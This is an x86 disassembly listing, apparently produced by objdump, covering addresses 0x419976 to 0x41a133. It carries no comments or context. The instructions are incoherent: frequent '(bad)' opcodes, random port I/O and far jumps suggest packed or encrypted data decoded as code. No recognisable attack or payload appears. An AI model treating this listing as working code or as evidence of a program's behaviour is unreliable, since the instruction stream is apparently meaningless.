  419976:	jmp    0x5149:0x595f3195
  41997d:	or     eax,0x35feb34f
  419982:	ret    
  419983:	xchg   ecx,eax
  419984:	mov    esp,0x23ada95b
  419989:	cmp    ah,BYTE PTR [edi+eax*2-0x1eb26837]
  419990:	xchg   bh,dl
  419992:	xchg   ebp,eax
  419993:	jp     0x4199c2
  419995:	push   ds
  419996:	cwde   
  419997:	(bad)  
  419998:	jo     0x41996e
  41999a:	ins    BYTE PTR es:[edi],dx
  41999b:	jns    0x41996f
  41999d:	(bad)  
  41999e:	iret   
  41999f:	push   esp
  4199a0:	pushf  
  4199a1:	mov    bh,0x9a
  4199a3:	mov    ecx,0x5253277c
  4199a8:	jp     0x41996b
  4199aa:	sub    DWORD PTR [ebx-0x7794d836],edx
  4199b0:	mov    bh,0xff
  4199b2:	pop    es
  4199b3:	rol    BYTE PTR ds:0x68aa5191,0xc0
  4199ba:	inc    ecx
  4199bb:	call   0x94:0x6b9096ea
  4199c2:	ja     0x41998c
  4199c4:	les    edi,FWORD PTR [eax-0x29]
  4199c7:	or     ebx,ebx
  4199c9:	mov    ebx,0x5aa4801e
  4199ce:	loop   0x4199d5
  4199d0:	or     eax,0x25101271
  4199d5:	dec    ebx
  4199d6:	push   ss
  4199d7:	arpl   bx,ax
  4199d9:	test   al,0xe2
  4199db:	dec    esi
  4199dc:	inc    ebp
  4199dd:	in     eax,0x92
  4199df:	cdq    
  4199e0:	gs cmc 
  4199e2:	mov    ah,0xdf
  4199e4:	fadd   QWORD PTR [edi+ebx*1]
  4199e7:	outs   dx,DWORD PTR ds:[esi]
  4199e8:	stos   DWORD PTR es:[edi],eax
  4199e9:	push   cs
  4199ea:	jnp    0x419981
  4199ec:	int    0x6d
  4199ee:	xchg   edi,eax
  4199ef:	pop    ebx
  4199f0:	in     al,dx
  4199f1:	cwde   
  4199f2:	or     bh,BYTE PTR [ecx+0x1f]
  4199f5:	pop    eax
  4199f6:	aam    0x8c
  4199f8:	mov    cl,0xe1
  4199fa:	cmc    
  4199fb:	bound  esi,QWORD PTR [edi-0x9ec3b49]
  419a01:	in     eax,0xb7
  419a03:	dec    ecx
  419a04:	xchg   ecx,eax
  419a05:	retf   
  419a06:	mov    cl,0x53
  419a08:	xor    dh,BYTE PTR [eax+0x43408e3a]
  419a0e:	mov    dl,dh
  419a10:	hlt    
  419a11:	push   eax
  419a12:	inc    eax
  419a13:	rcl    DWORD PTR [esi-0x2de42866],0xc2
  419a1a:	push   0x8e7fbccb
  419a1f:	pusha  
  419a20:	aaa    
  419a21:	int    0x47
  419a23:	xchg   esp,eax
  419a24:	push   esi
  419a25:	jge    0x1c10a0cf
  419a2b:	xchg   ebp,eax
  419a2c:	push   0x73e84204
  419a31:	jns    0x419a56
  419a33:	jbe    0x419a25
  419a35:	adc    DWORD PTR [ebp+0x11fd8eb6],ebp
  419a3b:	push   ebp
  419a3c:	(bad)  
  419a3d:	cmp    al,0x5d
  419a3f:	mov    bl,0x75
  419a41:	dec    ebx
  419a42:	in     al,0x2
  419a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a45:	retf   0xb995
  419a48:	xchg   ebx,eax
  419a49:	add    edx,esi
  419a4b:	stos   DWORD PTR es:[edi],eax
  419a4c:	xchg   ebx,eax
  419a4d:	jge    0x4199ef
  419a4f:	call   edx
  419a51:	cmp    eax,0xed193008
  419a56:	bound  ecx,QWORD PTR [edx-0x465268d5]
  419a5c:	mov    ebx,0x3af04297
  419a61:	call   0x2a66:0xeca7799b
  419a68:	jnp    0x419acd
  419a6a:	stc    
  419a6b:	push   esi
  419a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a6d:	adc    BYTE PTR [edi+0x77febe55],bh
  419a73:	lea    esp,[edx-0x6f04bd2a]
  419a79:	je     0x419a5e
  419a7b:	fld    DWORD PTR [edx+0x6e18b35e]
  419a81:	sahf   
  419a82:	mov    bh,BYTE PTR ds:0xdd4a0654
  419a88:	ror    DWORD PTR [edx+ebp*8-0x50],0x4a
  419a8d:	stc    
  419a8e:	sub    BYTE PTR [eax-0x4dd3177c],0x45
  419a95:	cmp    BYTE PTR [ecx+0x7a],ch
  419a98:	out    0x2a,al
  419a9a:	cdq    
  419a9b:	test   ebp,0x57ca0edd
  419aa1:	loop   0x419a92
  419aa3:	jmp    0x42fe:0x96717796
  419aaa:	cld    
  419aab:	dec    edx
  419aac:	xchg   esi,eax
  419aad:	jbe    0x419b16
  419aaf:	sub    ch,BYTE PTR [edi+eax*1-0x6b5ca8ef]
  419ab6:	or     ch,BYTE PTR [edi+eiz*4-0x3bf0174c]
  419abd:	pop    edi
  419abe:	int3   
  419abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac0:	fbld   TBYTE PTR [ebx+0x7f8967f]
  419ac6:	js     0x419aed
  419ac8:	pop    ss
  419ac9:	or     al,0x1
  419acb:	fistp  QWORD PTR [ebp+ebp*2+0x344bce91]
  419ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad3:	fistp  QWORD PTR [ebp+0xdf2717]
  419ad9:	adc    BYTE PTR [edx-0x46],dl
  419adc:	sti    
  419add:	fucomp st(1)
  419adf:	cld    
  419ae0:	inc    edi
  419ae1:	outs   dx,BYTE PTR ds:[esi]
  419ae2:	test   WORD PTR [edx-0xbdd547],di
  419ae9:	call   0x9d39:0xba06d78f
  419af0:	stos   BYTE PTR es:[edi],al
  419af1:	mov    ebp,ecx
  419af3:	lods   al,BYTE PTR ds:[esi]
  419af4:	addr16 rol ebp,1
  419af7:	add    ebp,DWORD PTR ds:0xdbde2393
  419afd:	xor    eax,0xdfd92a57
  419b02:	out    0x4c,eax
  419b04:	or     bh,BYTE PTR [ecx+esi*1+0x41a8735]
  419b0b:	out    dx,eax
  419b0c:	mov    esi,0xc1f91984
  419b11:	rcr    BYTE PTR [eax],cl
  419b13:	pop    ebp
  419b14:	int    0xa1
  419b16:	imul   edi,DWORD PTR [ebx+0x5b],0xffffff9a
  419b1a:	xlat   BYTE PTR ds:[ebx]
  419b1b:	push   eax
  419b1c:	gs int 0x5a
  419b1f:	sahf   
  419b20:	rol    DWORD PTR [ecx],1
  419b22:	push   eax
  419b23:	xchg   esi,eax
  419b24:	rcr    bl,0xa
  419b27:	aam    0xa2
  419b29:	stos   DWORD PTR es:[edi],eax
  419b2a:	nop
  419b2b:	mov    al,ds:0x22066b5b
  419b30:	rcl    BYTE PTR [eax-0x6b1f0b71],0xd4
  419b37:	(bad)  
  419b38:	push   ds
  419b39:	mov    ah,0x28
  419b3b:	jmp    0x419ac2
  419b3d:	cwde   
  419b3e:	inc    edx
  419b3f:	jne    0x419b95
  419b41:	outs   dx,DWORD PTR ds:[esi]
  419b42:	add    edi,esi
  419b44:	rol    DWORD PTR [ebx-0x1324cd00],cl
  419b4a:	jae    0x419b4f
  419b4c:	fst    DWORD PTR [esi+0x47d4c4e5]
  419b52:	lds    edi,FWORD PTR [ebp+0x5c226b33]
  419b58:	not    ebx
  419b5a:	retf   0x7be0
  419b5d:	call   0xcba47f84
  419b62:	mov    al,ds:0xacbab557
  419b67:	sbb    eax,0x3dd240fa
  419b6c:	mov    ah,0xf5
  419b6e:	cmc    
  419b6f:	jae    0x419be9
  419b71:	ss cmc 
  419b73:	xchg   edx,eax
  419b74:	dec    ebp
  419b75:	out    0xaa,eax
  419b77:	cli    
  419b78:	mov    dl,al
  419b7a:	outs   dx,DWORD PTR ds:[esi]
  419b7b:	ret    0x6989
  419b7e:	mov    DWORD PTR [edi],0x59c06d6f
  419b84:	scas   al,BYTE PTR es:[edi]
  419b85:	push   ds
  419b86:	(bad)  
  419b88:	into   
  419b89:	and    ch,ah
  419b8b:	outs   dx,BYTE PTR ds:[esi]
  419b8c:	and    DWORD PTR [esi+esi*8-0x7b692631],esp
  419b93:	test   eax,0x6dd56f21
  419b98:	dec    esi
  419b99:	into   
  419b9a:	out    dx,al
  419b9b:	jle    0x419bd5
  419b9d:	jae    0x419b7d
  419b9f:	push   cs
  419ba0:	lods   al,BYTE PTR ds:[esi]
  419ba1:	ficomp DWORD PTR [ebx-0x5904834e]
  419ba7:	add    ah,BYTE PTR [esi]
  419ba9:	sahf   
  419baa:	jnp    0x419b91
  419bac:	imul   eax,DWORD PTR ds:0x987647c9,0x6
  419bb3:	les    edi,FWORD PTR [ebp-0x4176fcb8]
  419bb9:	adc    BYTE PTR [edx-0x2ee037f9],ah
  419bbf:	jmp    FWORD PTR [ebp+0x41]
  419bc2:	sub    DWORD PTR [edx+0x2b276735],edi
  419bc8:	jecxz  0x419b6e
  419bca:	cmp    al,0xba
  419bcc:	sbb    eax,0x9b3911b9
  419bd1:	fucomip st,st(3)
  419bd3:	xor    DWORD PTR [edx],0xffffffe4
  419bd6:	sbb    bh,BYTE PTR [edi]
  419bd8:	stos   BYTE PTR es:[edi],al
  419bd9:	imul   bl
  419bdb:	xor    DWORD PTR [esi-0x6c],ebx
  419bde:	rol    BYTE PTR [esi+0x22],cl
  419be1:	ja     0x419b85
  419be3:	sub    BYTE PTR [ebx+edi*4+0x3c2dd5],ah
  419bea:	mov    dh,bl
  419bec:	in     eax,0xe5
  419bee:	daa    
  419bef:	mov    esi,DWORD PTR [eax]
  419bf1:	cmp    eax,DWORD PTR [ecx-0x6347f9ae]
  419bf7:	mov    ebp,0x9bfd15c5
  419bfc:	out    dx,al
  419bfd:	xchg   BYTE PTR [ebp-0x1b],al
  419c00:	pop    ecx
  419c01:	ja     0x419bae
  419c03:	aam    0xea
  419c05:	nop
  419c06:	popf   
  419c07:	dec    ebx
  419c08:	inc    ebp
  419c09:	call   0xf0702a6e
  419c0e:	push   es
  419c0f:	jg     0x419c61
  419c11:	div    DWORD PTR [eax-0x3c]
  419c14:	adc    dh,ch
  419c16:	mov    ecx,0xce0741c1
  419c1b:	add    edx,DWORD PTR [esi+0x76]
  419c1e:	in     al,dx
  419c1f:	ins    DWORD PTR es:[edi],dx
  419c20:	mov    ah,0xe2
  419c22:	sar    dl,0x91
  419c25:	jne    0x419baf
  419c27:	jnp    0x419bd6
  419c29:	(bad)  
  419c2a:	outs   dx,BYTE PTR ds:[esi]
  419c2b:	or     BYTE PTR [edi-0x1d5ca1cb],bl
  419c31:	fwait
  419c32:	jmp    0xc7849353
  419c37:	jne    0x419c2e
  419c39:	iret   
  419c3a:	call   0x8f63:0x4c264077
  419c41:	pop    ds
  419c42:	fimul  WORD PTR [ebx-0x64]
  419c45:	jle    0x419c50
  419c47:	pop    es
  419c48:	call   0x70ed:0x41399072
  419c4f:	jl     0x419c19
  419c51:	xchg   ecx,eax
  419c52:	out    0xe8,eax
  419c54:	adc    bl,BYTE PTR [ecx]
  419c56:	mov    eax,0x98348688
  419c5b:	in     al,0x7a
  419c5d:	dec    ebp
  419c5f:	ffree  st(7)
  419c61:	push   eax
  419c62:	mov    DWORD PTR [edi*8-0x6d92218c],eax
  419c69:	mov    bl,0xb9
  419c6b:	ror    BYTE PTR [edi-0x6d3d8abe],0x2b
  419c72:	inc    edx
  419c73:	add    ch,BYTE PTR [edx]
  419c75:	mov    eax,0x22d9a534
  419c7a:	sub    eax,ebp
  419c7c:	mov    al,0xe
  419c7e:	push   edi
  419c7f:	retf   
  419c80:	and    al,0x3b
  419c82:	and    eax,0x93964cf7
  419c87:	ins    BYTE PTR es:[edi],dx
  419c88:	rcl    DWORD PTR [ebp+0x66],1
  419c8b:	pause  
  419c8d:	popa   
  419c8e:	jb     0x419ceb
  419c90:	and    eax,0x5c13d9c6
  419c95:	pop    ds
  419c96:	push   edx
  419c97:	mov    ds:0x8abee672,al
  419c9c:	mov    ebp,gs
  419c9e:	lock out 0x7e,al
  419ca1:	sti    
  419ca2:	jmp    0x770b068
  419ca7:	mov    DWORD PTR [eax+ebp*1],edx
  419caa:	pop    ss
  419cab:	(bad)  
  419cac:	test   eax,0xf00a62f7
  419cb1:	imul   ebx,DWORD PTR [ebp+0x31],0xf42303a4
  419cb8:	mul    BYTE PTR [edi+0x26]
  419cbb:	mov    edi,0x7a2ff434
  419cc0:	jp     0x419ca3
  419cc2:	mov    cl,BYTE PTR [ebp-0x48]
  419cc5:	dec    ebx
  419cc6:	cmp    dh,BYTE PTR [eax]
  419cc8:	arpl   WORD PTR [edi],bp
  419cca:	inc    ebx
  419ccb:	arpl   bx,si
  419ccd:	mov    ebp,0x3f2e31bd
  419cd2:	mov    cl,0xf4
  419cd4:	push   edi
  419cd5:	inc    edi
  419cd6:	jmp    0x419d3d
  419cd8:	nop
  419cd9:	popf   
  419cda:	out    dx,al
  419cdb:	jb     0x419d47
  419cdd:	xor    al,0x82
  419cdf:	jmp    0x419c8d
  419ce1:	aaa    
  419ce2:	and    BYTE PTR [eax],0x31
  419ce5:	xchg   BYTE PTR [esi-0x3e75dd57],dl
  419ceb:	push   ebp
  419cec:	mov    cl,0x19
  419cee:	or     esi,eax
  419cf0:	lea    ebp,[ecx+0x55]
  419cf3:	sti    
  419cf4:	in     eax,0xd2
  419cf6:	xor    DWORD PTR [ebp-0x26003a6e],eax
  419cfc:	adc    dl,cl
  419cfe:	out    0xce,eax
  419d00:	push   ss
  419d01:	pop    esi
  419d02:	dec    ebp
  419d03:	push   ds
  419d04:	(bad)  
  419d06:	out    dx,eax
  419d07:	jo     0x419d02
  419d09:	adc    dh,BYTE PTR [ecx-0x48]
  419d0c:	adc    DWORD PTR [esi],edx
  419d0e:	mov    ah,0x98
  419d10:	mov    esp,0x226c99d
  419d15:	cld    
  419d16:	test   BYTE PTR [edx-0x3efd0b5f],dh
  419d1c:	push   edi
  419d1d:	add    ebp,DWORD PTR [ebp-0x5d485706]
  419d23:	daa    
  419d24:	das    
  419d25:	push   esp
  419d26:	sar    BYTE PTR [edi+0x34],0x0
  419d2a:	push   esp
  419d2b:	lods   al,BYTE PTR ds:[esi]
  419d2c:	lods   eax,DWORD PTR ds:[esi]
  419d2d:	push   ebp
  419d2e:	daa    
  419d2f:	test   eax,0xacfb991c
  419d34:	out    0x9e,eax
  419d36:	lock popf 
  419d38:	mov    ?,WORD PTR [edx]
  419d3a:	mov    esi,0xaf8b4f21
  419d3f:	jecxz  0x419cf6
  419d41:	lss    ebx,FWORD PTR [ecx-0x20]
  419d45:	mov    ?,WORD PTR [edx-0x6dc858f9]
  419d4b:	cmp    eax,0x58d5d3a7
  419d50:	adc    BYTE PTR [edi+0x10d6b2ed],al
  419d56:	test   ah,dl
  419d58:	push   0x1b
  419d5a:	pop    esp
  419d5b:	stos   BYTE PTR es:[edi],al
  419d5c:	xor    eax,0x839ecff0
  419d61:	lahf   
  419d62:	push   esp
  419d63:	adc    al,BYTE PTR [edx+0x57]
  419d66:	ins    DWORD PTR es:[edi],dx
  419d67:	cmc    
  419d68:	push   cs
  419d69:	xchg   esp,eax
  419d6a:	cmp    BYTE PTR [edx-0x6aa1667c],bl
  419d70:	loop   0x419d05
  419d72:	adc    esp,DWORD PTR [esi+eax*1-0x7e]
  419d76:	xchg   ebp,eax
  419d77:	sbb    eax,0x3d55fd5e
  419d7c:	aad    0x65
  419d7e:	shl    DWORD PTR [ecx-0x5a],0xa4
  419d82:	add    eax,0x82f0f4f3
  419d87:	(bad)  
  419d89:	cmp    cl,bh
  419d8b:	push   0x86549dad
  419d90:	push   ebx
  419d91:	ret    0xb6de
  419d94:	xor    DWORD PTR [ebx],0x2c085294
  419d9a:	and    dh,BYTE PTR [esi-0x3a57f5f3]
  419da0:	out    0x2d,eax
  419da2:	jmp    0x3bf8395d
  419da7:	imul   esp,DWORD PTR [eax],0x2e
  419daa:	xor    eax,0xb57dfda6
  419daf:	retf   0x61e5
  419db2:	inc    esp
  419db3:	pop    sp
  419db5:	enter  0xd764,0xe6
  419db9:	push   esi
  419dba:	adc    eax,DWORD PTR [ebp-0x6996dcee]
  419dc0:	ret    
  419dc1:	jp     0x419d6c
  419dc3:	or     DWORD PTR [esp+esi*2],ebx
  419dc6:	nop
  419dc7:	sbb    al,0xa2
  419dc9:	inc    ebx
  419dca:	das    
  419dcb:	push   ebp
  419dcc:	dec    ecx
  419dcd:	xchg   esi,eax
  419dce:	sbb    cl,BYTE PTR gs:[edx-0x4c988e81]
  419dd5:	scas   al,BYTE PTR es:[edi]
  419dd6:	xchg   edi,eax
  419dd7:	stos   DWORD PTR es:[edi],eax
  419dd8:	(bad)  
  419dda:	pop    es
  419ddb:	push   ecx
  419ddc:	rcr    BYTE PTR [ebx],1
  419dde:	push   ebp
  419ddf:	loop   0x419e15
  419de1:	jecxz  0x419e46
  419de3:	xchg   dl,ch
  419de5:	dec    ebp
  419de6:	ins    DWORD PTR es:[edi],dx
  419de7:	shl    esi,cl
  419de9:	outs   dx,DWORD PTR ds:[esi]
  419dea:	cmp    BYTE PTR [edi],dh
  419dec:	adc    bl,al
  419dee:	or     BYTE PTR [esi],0x74
  419df1:	(bad)  
  419df2:	dec    ecx
  419df4:	in     al,dx
  419df5:	push   ecx
  419df6:	add    ebp,edx
  419df8:	dec    ebx
  419df9:	scas   eax,DWORD PTR es:[edi]
  419dfa:	and    eax,0xe81ce3e2
  419dff:	xchg   edi,eax
  419e00:	ret    0xa74d
  419e03:	fistp  DWORD PTR [edx+eax*4+0x1a]
  419e07:	outs   dx,BYTE PTR ds:[esi]
  419e08:	dec    esi
  419e09:	sbb    ebp,DWORD PTR [edi+edx*8+0x27]
  419e0d:	loope  0x419dc8
  419e0f:	and    BYTE PTR [edx+0x496af622],cl
  419e15:	jmp    0x419de9
  419e17:	ja     0x419dda
  419e19:	add    BYTE PTR [esi-0x3c097593],0xb0
  419e20:	push   0x7b
  419e22:	(bad)  
  419e23:	xor    eax,0x7f21c8b4
  419e28:	xlat   BYTE PTR ds:[ebx]
  419e29:	loopne 0x419dec
  419e2b:	mov    dh,0xa
  419e2d:	mov    al,0xd4
  419e2f:	mov    ecx,0xddcbccf5
  419e34:	imul   ecx,DWORD PTR [ebp-0x76],0xaa2ea143
  419e3b:	out    dx,al
  419e3c:	sub    al,0x48
  419e3e:	inc    esp
  419e3f:	cmp    al,0x1b
  419e41:	pop    ebx
  419e42:	push   0xbe847e9b
  419e47:	stc    
  419e48:	loope  0x419e44
  419e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e4b:	mov    dl,0x66
  419e4d:	ret    
  419e4e:	loopne 0x419e43
  419e50:	aam    0x8a
  419e52:	jo     0x419dd6
  419e54:	add    al,0x83
  419e56:	outs   dx,DWORD PTR ds:[esi]
  419e57:	loop   0x419dee
  419e59:	ror    BYTE PTR [esp+eax*1],cl
  419e5c:	sub    ebx,esp
  419e5e:	out    dx,eax
  419e5f:	cs or  eax,esp
  419e62:	loope  0x419dfb
  419e64:	pop    edx
  419e65:	or     al,0xd8
  419e67:	mov    ds:0x934c6efc,eax
  419e6c:	or     ebp,DWORD PTR [esi]
  419e6e:	add    eax,0xb238367
  419e73:	stos   DWORD PTR es:[edi],eax
  419e74:	(bad)  
  419e75:	jle    0x419eb8
  419e77:	fistp  WORD PTR [eax+0x6e]
  419e7a:	das    
  419e7b:	fcomp  DWORD PTR [ecx+0x760ecfee]
  419e81:	sub    dl,BYTE PTR ds:0x35efab8d
  419e87:	dec    esi
  419e88:	adc    al,0x91
  419e8a:	sub    ah,BYTE PTR [ebx]
  419e8c:	loop   0x419ef8
  419e8e:	push   0x594afbd2
  419e93:	mov    WORD PTR [ebp+esi*4-0x42],gs
  419e97:	xor    eax,DWORD PTR ds:0x7a479b09
  419e9d:	and    bl,BYTE PTR [ecx+0x132b0434]
  419ea3:	je     0x419ecd
  419ea5:	inc    eax
  419ea6:	rol    DWORD PTR [edx-0x3e],0x56
  419eaa:	or     BYTE PTR [ebp-0x48],ah
  419ead:	dec    ecx
  419eae:	adc    BYTE PTR [ecx],dh
  419eb0:	ror    dl,cl
  419eb2:	mov    bl,0x80
  419eb4:	sbb    eax,0xf257cde2
  419eb9:	sti    
  419eba:	inc    ebp
  419ebb:	call   0xd8fa:0xbc7710d7
  419ec2:	lock jmp 0x23f47bf9
  419ec8:	mov    esp,0x21def8e4
  419ecd:	mov    ds:0xd8b9276e,al
  419ed2:	jnp    0x419e6f
  419ed4:	sbb    BYTE PTR [esp+edx*4+0x3081f8f],bl
  419edb:	sub    eax,0x7fddc308
  419ee0:	unpcklps xmm0,xmm4
  419ee3:	int3   
  419ee4:	iret   
  419ee5:	mov    bh,0x3a
  419ee7:	retf   
  419ee8:	nop
  419ee9:	(bad)  
  419eea:	inc    ebp
  419eeb:	or     eax,0x2554c3e0
  419ef0:	test   BYTE PTR fs:[edx],al
  419ef3:	mov    ebx,0xaf815b4c
  419ef8:	jns    0x419f56
  419efa:	aad    0xcc
  419efc:	lods   al,BYTE PTR ds:[esi]
  419efd:	fs lahf 
  419eff:	dec    edi
  419f00:	cmp    eax,0x77a3ba5d
  419f05:	cli    
  419f06:	(bad)  
  419f0a:	ins    BYTE PTR es:[edi],dx
  419f0b:	test   al,ah
  419f0d:	cdq    
  419f0e:	popa   
  419f0f:	mov    ecx,0xdcd4e4f3
  419f14:	mov    al,ds:0x4542c4a1
  419f19:	test   al,0x77
  419f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f1c:	and    al,0xe7
  419f1e:	inc    ecx
  419f1f:	retf   
  419f20:	inc    esi
  419f21:	mov    ecx,0xb0d4b0e2
  419f26:	outs   dx,DWORD PTR ds:[esi]
  419f27:	or     al,BYTE PTR ds:0x15580e75
  419f2d:	fimul  WORD PTR [ecx+eiz*8]
  419f30:	fdiv   DWORD PTR es:[ebp+0x112723d5]
  419f37:	pop    ebp
  419f38:	add    eax,ebx
  419f3a:	jbe    0x419fa0
  419f3c:	test   eax,0x11c33a18
  419f41:	imul   ebp,DWORD PTR [esi+0x2a],0x4d
  419f45:	in     al,0xb0
  419f47:	iret   
  419f48:	mov    DWORD PTR ds:0x42a6922e,ebx
  419f4e:	inc    edi
  419f4f:	cmp    eax,0xb210bf40
  419f54:	xchg   esi,eax
  419f55:	aad    0x34
  419f57:	mov    DWORD PTR [ecx+0xc],ebx
  419f5a:	push   es
  419f5b:	sbb    DWORD PTR [eax+0x61],0x1f75d581
  419f62:	sar    dh,0x85
  419f65:	sub    eax,0x6613e3c6
  419f6a:	lods   al,BYTE PTR ds:[esi]
  419f6b:	push   ecx
  419f6c:	push   ds
  419f6d:	xor    cl,dh
  419f6f:	cmp    cl,BYTE PTR [ecx-0xe]
  419f72:	fidivr DWORD PTR [ebx-0x17]
  419f75:	das    
  419f76:	or     DWORD PTR [esi],0x13cfa27e
  419f7c:	add    al,0xa1
  419f7e:	mov    bl,0x4a
  419f80:	shl    DWORD PTR ds:0xa705c408,cl
  419f86:	pusha  
  419f87:	jl     0x419f44
  419f89:	jno    0x41a007
  419f8b:	lahf   
  419f8c:	fcomi  st,st(4)
  419f8e:	sbb    eax,0x8cc08ffc
  419f93:	jmp    0xb2dd:0x295724a9
  419f9a:	pop    ebx
  419f9b:	retf   
  419f9c:	push   esi
  419f9d:	sbb    ebx,ebp
  419f9f:	repnz pop esp
  419fa1:	xor    al,0x64
  419fa3:	jle    0x419fd8
  419fa5:	add    eax,0xca048a3a
  419faa:	mov    ebx,0x5e80bf76
  419faf:	jbe    0x419fee
  419fb1:	pop    ecx
  419fb2:	jp     0x41a01b
  419fb4:	repz pop ebx
  419fb6:	cdq    
  419fb7:	xchg   esi,eax
  419fb8:	(bad)  
  419fb9:	mov    bl,0xd2
  419fbb:	and    dh,BYTE PTR [edi-0x4e728ef4]
  419fc1:	pop    ds
  419fc2:	sti    
  419fc3:	imul   ebx,DWORD PTR [edx+0x13],0x87a26f4
  419fca:	stos   DWORD PTR es:[edi],eax
  419fcb:	call   0x325fde2f
  419fd0:	mov    ah,0xad
  419fd2:	popa   
  419fd3:	add    BYTE PTR [ebp+0x11],al
  419fd6:	fistp  DWORD PTR [edx+0x344447c4]
  419fdc:	jmp    0x7f18:0x1af35b7e
  419fe3:	(bad)  
  419fe4:	mul    BYTE PTR [eax+0x48716302]
  419fea:	adc    eax,0xc7268b67
  419fef:	sbb    esp,DWORD PTR [esi-0x2]
  419ff2:	retf   0x8f49
  419ff5:	les    edi,FWORD PTR [ecx]
  419ff7:	cmp    DWORD PTR [ecx+0x7e],edi
  419ffa:	shl    DWORD PTR [esi],0x69
  419ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ffe:	cmp    bh,BYTE PTR [edx+0x75e61b4f]
  41a004:	jecxz  0x41a009
  41a006:	jo     0x419fd7
  41a008:	sub    al,0x4d
  41a00a:	push   ss
  41a00b:	dec    ebp
  41a00c:	dec    ecx
  41a00d:	adc    eax,0xda4ffb41
  41a012:	cld    
  41a013:	and    DWORD PTR [ebx+0x18ee5cae],edx
  41a019:	sbb    al,0xee
  41a01b:	mov    al,0xd
  41a01d:	(bad)  
  41a01e:	fbstp  TBYTE PTR [ebx-0x14]
  41a021:	popf   
  41a022:	enter  0x6b8e,0x80
  41a026:	mov    eax,ds:0xbb8137a1
  41a02b:	mov    al,ds:0x56a910b0
  41a030:	inc    ebx
  41a031:	jp     0x41a06b
  41a033:	fwait
  41a034:	repz jecxz 0x41a019
  41a037:	jns    0x41a006
  41a039:	push   cs
  41a03a:	into   
  41a03b:	ds es stos DWORD PTR es:[edi],eax
  41a03e:	inc    esi
  41a03f:	pop    ss
  41a040:	xor    bh,BYTE PTR [edx]
  41a042:	inc    eax
  41a043:	xchg   ecx,eax
  41a044:	add    ch,ah
  41a046:	jae    0x41a0ba
  41a048:	mov    ds:0xccf7fe2d,eax
  41a04d:	out    dx,ax
  41a04f:	xor    BYTE PTR [ebx],ah
  41a051:	push   ebx
  41a052:	or     DWORD PTR [edx+eiz*2+0x4f7ac984],edi
  41a059:	nop
  41a05a:	mov    ebp,es
  41a05c:	cmc    
  41a05d:	pop    edi
  41a05e:	das    
  41a05f:	xlat   BYTE PTR ds:[ebx]
  41a060:	frstor [ebp-0x24]
  41a063:	(bad)  
  41a064:	fst    QWORD PTR [esi+0x13e77c14]
  41a06a:	jne    0x41a0c8
  41a06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a06d:	push   eax
  41a06e:	lock pop ecx
  41a070:	inc    ecx
  41a071:	jle    0x41a042
  41a073:	mov    edi,0x54ae768d
  41a078:	out    0xef,eax
  41a07a:	pop    ebx
  41a07b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a07c:	sahf   
  41a07d:	out    0x63,eax
  41a07f:	xor    DWORD PTR [ebx-0x56d7bf16],esi
  41a085:	jmp    0x41a083
  41a087:	push   ecx
  41a088:	push   edi
  41a089:	pop    es
  41a08a:	inc    esp
  41a08b:	pop    ds
  41a08c:	mov    dl,0xde
  41a08e:	aaa    
  41a08f:	inc    ebp
  41a090:	inc    esi
  41a091:	xchg   BYTE PTR [ecx-0x64],cl
  41a094:	inc    esi
  41a095:	sti    
  41a096:	mov    bl,0xaa
  41a098:	mov    bl,0x3e
  41a09a:	dec    eax
  41a09b:	enter  0xa6c3,0xc6
  41a09f:	outs   dx,BYTE PTR ds:[esi]
  41a0a0:	xlat   BYTE PTR ds:[ebx]
  41a0a1:	dec    ebp
  41a0a2:	cld    
  41a0a3:	jne    0x41a040
  41a0a5:	fistp  QWORD PTR [ebp-0x14]
  41a0a8:	stos   BYTE PTR es:[edi],al
  41a0a9:	mov    al,0xcf
  41a0ab:	xor    BYTE PTR [eax+0x50d8a593],ch
  41a0b1:	into   
  41a0b2:	hlt    
  41a0b3:	xor    DWORD PTR [esi+0x26],0x28
  41a0b7:	popa   
  41a0b8:	jp     0x41a0a1
  41a0ba:	fs push cs
  41a0bc:	(bad)  
  41a0bd:	call   0x5e90c112
  41a0c2:	in     eax,0x12
  41a0c4:	in     al,dx
  41a0c5:	dec    edi
  41a0c6:	cmc    
  41a0c7:	scas   al,BYTE PTR es:[edi]
  41a0c8:	jne    0x41a0f4
  41a0ca:	and    BYTE PTR [esp],dl
  41a0cd:	(bad)  
  41a0ce:	push   edi
  41a0cf:	nop
  41a0d0:	gs xor eax,0x5c508955
  41a0d6:	mov    edx,0x551459af
  41a0db:	stos   DWORD PTR es:[edi],eax
  41a0dc:	add    al,0x99
  41a0de:	fst    DWORD PTR [edx+0x2f]
  41a0e1:	dec    esp
  41a0e2:	out    0xed,eax
  41a0e4:	jmp    0x93fc1aa2
  41a0e9:	outs   dx,BYTE PTR ds:[esi]
  41a0ea:	inc    ecx
  41a0eb:	arpl   WORD PTR [ebx+0x2078f069],cx
  41a0f1:	and    esp,ecx
  41a0f3:	(bad)  
  41a0f4:	push   ecx
  41a0f5:	pusha  
  41a0f6:	cdq    
  41a0f7:	add    esi,esi
  41a0f9:	shr    eax,0xcb
  41a0fc:	out    0x9a,al
  41a0fe:	xchg   ecx,eax
  41a0ff:	cmc    
  41a100:	pop    ebp
  41a101:	sbb    eax,0xb2766183
  41a106:	add    eax,0xa6310715
  41a10b:	jp     0x41a0fa
  41a10d:	pop    esp
  41a10e:	xor    al,0x4d
  41a110:	and    dl,BYTE PTR ds:0xdb5b1795
  41a116:	lahf   
  41a117:	dec    eax
  41a118:	cdq    
  41a119:	mov    BYTE PTR [esp],bh
  41a11c:	and    eax,0x91c03d6f
  41a121:	daa    
  41a122:	stos   DWORD PTR es:[edi],eax
  41a123:	pop    eax
  41a124:	scas   eax,DWORD PTR es:[edi]
  41a125:	sbb    eax,DWORD PTR [esi-0x5]
  41a128:	xchg   ebx,eax
  41a129:	loope  0x41a114
  41a12b:	push   ss
  41a12c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a12d:	sbb    cl,BYTE PTR [ebp-0x1faa5f90]
  41a133:	pop    es
